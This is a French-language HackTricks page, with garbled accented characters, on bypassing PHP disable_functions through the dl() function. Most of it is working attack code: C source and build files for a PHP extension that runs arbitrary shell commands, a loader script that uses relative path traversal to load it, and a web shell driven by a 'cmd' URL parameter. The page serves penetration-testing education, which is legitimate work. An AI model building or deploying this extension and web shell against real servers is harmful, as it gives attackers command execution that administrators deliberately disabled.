<details>

<summary><strong>Apprenez le hacking AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> !</strong></summary>

Autres moyens de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Obtenez le [**merchandising officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de hacking en soumettant des PR aux d√©p√¥ts github** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

**Note importante :**

![image](https://user-images.githubusercontent.com/84577967/174675487-a4c4ca06-194f-4725-85af-231a2f35d56c.png)

**`dl`** est une fonction PHP qui peut √™tre utilis√©e pour charger des extensions PHP. Si la fonction n'est pas d√©sactiv√©e, elle pourrait √™tre exploit√©e pour **contourner `disable_functions` et ex√©cuter des commandes arbitraires**.\
Cependant, elle a des limitations strictes :

* La fonction `dl` doit √™tre **pr√©sente** dans l'**environnement** et **non d√©sactiv√©e**
* L'extension PHP **doit √™tre compil√©e avec la m√™me version majeure** (version de l'API PHP) que celle utilis√©e par le serveur (vous pouvez voir cette information dans la sortie de phpinfo)
* L'extension PHP doit √™tre **situ√©e dans le r√©pertoire** qui est **d√©fini** par la directive **`extension_dir`** (vous pouvez le voir dans la sortie de phpinfo). Il est tr√®s improbable qu'un attaquant essayant d'abuser du serveur ait un acc√®s en √©criture sur ce r√©pertoire, donc cette exigence vous emp√™chera probablement d'exploiter cette technique).

**Si vous remplissez ces conditions, continuez √† lire cet article copi√© de** [**https://antichat.com/threads/70763/**](https://antichat.com/threads/70763/) **pour apprendre comment contourner disable\_functions**

Lorsque l'administrateur configurait la machine, il/elle a n√©glig√© la [fonction dl](http://www.php.net/manual/en/function.dl.php) et ne l'a pas d√©sactiv√©e car il n'y avait aucune mention de la possibilit√© d'ex√©cuter des commandes syst√®me.\
La [fonction dl](http://www.php.net/manual/en/function.dl.php) est utilis√©e pour charger des extensions PHP lorsqu'un script est ex√©cut√©.\
\
(Les extensions PHP sont √©crites en C/C++ et sont utilis√©es pour donner plus de fonctionnalit√©s √† PHP.)\
\
L'attaquant remarque que la fonction n'est pas d√©sactiv√©e et voit un potentiel et d√©cide de cr√©er une extension PHP.\
L'attaquant v√©rifie la version de PHP en utilisant un petit script `<?php echo 'La version de PHP est '.PHP_VERSION; ?>` (PHP\_VERSION est une constante pr√©d√©finie qui contient le num√©ro de version de PHP.)\
\
L'attaquant note la version et t√©l√©charge le tarball depuis le [site web PHP](http://www.php.net/downloads.php), dans ce sc√©nario la version est plus ancienne que la version actuelle donc l'attaquant doit aller √† l'[archive](http://museum.php.net).\
\
Ensuite, il extrait la source et [compile et installe](http://www.php.net/manual/en/install.php) la version de PHP sur sa propre machine.\
\
Maintenant, il est temps de cr√©er l'extension\
L'attaquant se renseigne sur [la cr√©ation d'extensions PHP](http://www.php.net/manual/en/zend.creating.php) sur le site PHP.\
Apr√®s avoir lu la documentation et cr√©√© quelques extensions de son propre chef, il d√©cide de regarder le code source de PHP puisque la fonction qu'il recherche est d√©j√† cr√©√©e.\
\
La fonction qui sera dupliqu√©e sera la [fonction exec](http://www.php.net/manual/en/function.exec.php)\
dans le code source, elle est situ√©e dans ext/standard/exec.c\
\
Les parties pertinentes sont impl√©ment√©es dans une nouvelle extension √† part enti√®re.\
\

**Notes :**

Avant de commencer √† compiler les codes, vous devez √™tre conscient de deux points :

1- La valeur de `ZEND_MODULE_API_NO` doit √™tre modifi√©e dans le fichier `bypass.c` pour correspondre √† la `Zend Extension Build` actuelle sur laquelle vous travaillez, vous pouvez l'obtenir en utilisant la ligne de commande ci-dessous :
```bash
php -i | grep "Zend Extension Build" |awk -F"API4" '{print $2}' | awk -F"," '{print $1}'
```
2- Si vous rencontrez des erreurs lors de la compilation du fichier bypass.c dans la version r√©cente de PHP (5, 7 et 8), vous pouvez changer le PHP_FUNCTION(bypass_exec) par ceci :
```
PHP_FUNCTION(bypass_exec)
{
FILE *in;
char *command;
size_t command_len;
zend_string *ret;
php_stream *stream;

ZEND_PARSE_PARAMETERS_START(1, 1)
Z_PARAM_STRING(command, command_len)
ZEND_PARSE_PARAMETERS_END();

if (!command_len) {
zend_argument_value_error(1, "cannot be empty");
RETURN_THROWS();
}
if (strlen(command) != command_len) {
zend_argument_value_error(1, "must not contain any null bytes");
RETURN_THROWS();
}

#ifdef PHP_WIN32
if ((in=VCWD_POPEN(command, "rt"))==NULL) {
#else
if ((in=VCWD_POPEN(command, "r"))==NULL) {
#endif
php_error_docref(NULL, E_WARNING, "Unable to execute '%s'", command);
RETURN_FALSE;
}

stream = php_stream_fopen_from_pipe(in, "rb");
ret = php_stream_copy_to_mem(stream, PHP_STREAM_COPY_ALL, 0);
php_stream_close(stream);

if (ret && ZSTR_LEN(ret) > 0) {
RETVAL_STR(ret);
}
}
```
Les fichiers pour l'extension s√©par√©e se terminent comme ci-dessous :

{% code title="bypass.c" %}
```c
/*
+----------------------------------------------------------------------+
| Copyright (c) 1997-2003 The PHP Group                                |
+----------------------------------------------------------------------+
| This source file is subject to version 2.02 of the PHP license,      |
| that is bundled with this package in the file LICENSE, and is        |
| available at through the world-wide-web at                           |
| http://www.php.net/license/2_02.txt.                                 |
| If you did not receive a copy of the PHP license and are unable to   |
| obtain it through the world-wide-web, please send a note to          |
| license@php.net so we can mail you a copy immediately.               |
+----------------------------------------------------------------------+
*/


#ifdef HAVE_CONFIG_H
#include "config.h"
#endif

#include "php.h"
#include "php_bypass.h"

static function_entry bypass_functions[] = {
PHP_FE(bypass_exec, NULL)
{NULL, NULL, NULL}
};

zend_module_entry bypass_module_entry = {
#if ZEND_MODULE_API_NO >= 20010901
STANDARD_MODULE_HEADER,
#endif
PHP_BYPASS_EXTNAME,
bypass_functions,
NULL,
NULL,
NULL,
NULL,
NULL,
#if ZEND_MODULE_API_NO >= 20010901
PHP_BYPASS_VERSION,
#endif
STANDARD_MODULE_PROPERTIES
};

#ifdef COMPILE_DL_BYPASS
ZEND_GET_MODULE(bypass)
#endif


PHP_FUNCTION(bypass_exec){
FILE *in;
int readbytes, total_readbytes=0, allocated_space;
pval **cmd;
char *ret;

if (ZEND_NUM_ARGS()!=1 || zend_get_parameters_ex(1, &cmd)==FAILURE) {
WRONG_PARAM_COUNT;
}

convert_to_string_ex(cmd);
#ifdef PHP_WIN32
if ((in=VCWD_POPEN(Z_STRVAL_PP(cmd), "rt"))==NULL) {
#else
if ((in=VCWD_POPEN(Z_STRVAL_PP(cmd), "r"))==NULL) {
#endif
php_error_docref(NULL TSRMLS_CC, E_WARNING, "Unable to execute '%s'", Z_STRVAL_PP(cmd));
RETURN_FALSE;
}

allocated_space = EXEC_INPUT_BUF;
ret = (char *) emalloc(allocated_space);

while (1) {
readbytes = fread(ret+total_readbytes, 1, EXEC_INPUT_BUF, in);
if (readbytes<=0) {
break;
}

total_readbytes += readbytes;
allocated_space = total_readbytes+EXEC_INPUT_BUF;
ret = (char *) erealloc(ret, allocated_space);
}

pclose(in);

RETVAL_STRINGL(ret, total_readbytes, 0);
Z_STRVAL_P(return_value)[total_readbytes] = '\';
}
```
```markdown
{% endcode %}

{% code title="php_bypass.h" %}
```
```c
#ifndef PHP_BYPASS_H
#define PHP_BYPASS_H 1

#define PHP_BYPASS_VERSION "1.0"
#define PHP_BYPASS_EXTNAME "bypass"

PHP_FUNCTION(bypass_exec);

extern zend_module_entry bypass_module_entry;
#define phpext_bypass_ptr &bypass_module_entry

#endif
```
```markdown
{% endcode %}

{% code title="config.m4" %}
```
```bash
PHP_ARG_ENABLE(bypass, [whether to enable bypass support],[--enable-bypass])

if test "$PHP_BYPASS" = "yes"; then
AC_DEFINE(HAVE_BYPASS, 1, [Whether you have bypass])
PHP_NEW_EXTENSION(bypass, bypass.c, $ext_shared)
fi
```
{% endcode %}

Une fois les fichiers cr√©√©s, il est temps de construire l'extension PHP.
```
phpize
./configure
make
```
Une fois cela fait, l'extension compil√©e se trouvera dans le sous-r√©pertoire modules avec le nom de fichier bypass.so.
Le fichier est copi√© dans un endroit s√ªr, maintenant les commandes suivantes sont ex√©cut√©es pour nettoyer les fichiers nouvellement cr√©√©s.
```
make clean
phpize --clean
```
Maintenant, l'attaquant t√©l√©verse la nouvelle extension cr√©√©e sur l'h√¥te victime.

(REMARQUE : Les versions majeures de PHP utilisent diff√©rentes versions de l'API, pour que vous puissiez compiler l'extension sur un h√¥te et la t√©l√©verser sur un autre, les versions de l'API doivent correspondre. C'est pourquoi initialement la m√™me version de PHP a √©t√© install√©e sur la machine de l'attaquant.)

Pour charger une extension avec la fonction dl, l'extension doit se trouver dans le r√©pertoire des extensions d√©fini par la directive extension_dir.
Cela peut poser probl√®me car il est peu probable que l'attaquant ait les permissions d'√©criture dans ce r√©pertoire, il existe cependant un moyen de contourner cela.
Ce probl√®me a √©t√© discut√© par les d√©veloppeurs sur la page de la fonction dl, dans la section des notes.

Le concept discut√© est d'utiliser un chemin relatif √† partir du r√©pertoire des extensions d√©fini.
Par exemple, si le r√©pertoire des extensions √©tait d√©fini sur /usr/php/extensions et que vous souhaitez charger bypass.so dans le r√©pertoire web actuel /home/example.com/html, vous proc√©deriez comme suit :
```php
<?php
dl('../../../home/example.com/html/bypass.so');
?>
```
Cela permet de contourner la n√©cessit√© d'avoir l'extension dans le r√©pertoire d'extensions d√©fini.

Il existe √©galement une m√©thode automatis√©e pour ne pas avoir √† changer le chemin relatif pour diff√©rents h√¥tes, ce code a √©t√© cr√©√© par endofyourself \[at] yahoo \[dot] com et am√©lior√© par la suite par mag\_2000 \[at] front \[dot] ru

Il y avait un petit probl√®me avec la fonction, sur certains h√¥tes le r√©pertoire d'extensions est d√©fini sur "./". Cette fonction ne prenait pas en compte si le r√©pertoire d'extensions √©tait d√©fini sur un chemin relatif, la solution √† ce probl√®me est d'utiliser la fonction realpath.

Le script final utilis√© pour charger l'extension et ex√©cuter des commandes syst√®me afin de contourner les fonctions d√©sactiv√©es est le suivant :
```php
<?php

function dl_local( $extensionFile ) {
if(!(bool)ini_get('enable_dl')
||(bool)ini_get('safe_mode')){
die('Loading extensions is not permitted.');
}

if(!file_exists($extensionFile)){
die('File '.$extensionFile.' does not exist.');
}

if(!is_executable($extensionFile)){
die('File '.$extensionFile.' is not executable. ( chmod +x '.$extensionFile.' )');
}

$currentDir = getcwd().'/';
$currentExtPath = realpath(ini_get('extension_dir'));

$subDirs = preg_match_all("/\//",$currentExtPath ,$matches);
unset($matches);

if(!(bool)$subDirs){
die('Could not determine a valid extension path [extension_dir]');
}

$extPathLastChar=strlen($currentExtPath )-1;

if($extPathLastChar==strrpos($currentExtPath,'/')){
$subDirs--;}$backDirStr = '';

for($i = 1; $i <= $subDirs; $i++){
$backDirStr .='..';
if($i != $subDirs){
$backDirStr .='/';
}
}

$finalExtPath = $backDirStr.$currentDir.$extensionFile;
if(!dl($finalExtPath)){
die();
}


$loadedExtensions = get_loaded_extensions();
$thisExtName = $loadedExtensions[sizeof($loadedExtensions)-1];
return $thisExtName;
}

@ini_set ('display_errors','1');
error_reporting(E_ALL);

dl_local('bypass.so');

if(@$_GET['cmd']){
$output = bypass_exec($_GET['cmd']);
echo '<pre>'.$output.'</pre>';
}
?>
```
Tout ce que l'attaquant doit faire maintenant pour ex√©cuter des commandes est d'appeler l'URL du script avec une variable cmd contenant la commande souhait√©e.
```
http://www.example.com/script.php?cmd=ls
```
<details>

<summary><strong>Apprenez le hacking AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres moyens de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez**-moi sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de hacking en soumettant des PR aux d√©p√¥ts github** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
